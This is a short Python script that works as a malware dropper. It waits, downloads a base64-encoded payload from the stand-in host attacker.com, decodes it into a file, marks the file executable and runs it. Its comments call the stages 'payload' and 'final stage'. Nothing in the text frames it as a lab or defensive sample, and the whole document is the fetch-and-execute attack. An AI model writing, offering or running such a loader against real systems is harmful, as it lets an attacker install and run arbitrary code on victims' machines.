import base64
import os
import time
import requests

#Sleep 5 seconds
time.sleep(5)

#Get base64 payloS
req=requests.get('http://attacker.com/b64')
b64=req.content

#Decode payload
decoded=base64.decodebytes(b64)

#Write content to binwary file
with open("bin","wb") as out :
	out.write(decoded)
	out.close()
#Set execution permissions
os.system('chmod +x bin')
time.sleep(1)
#Execute final stage 
os.system('./bin > x.maleware')
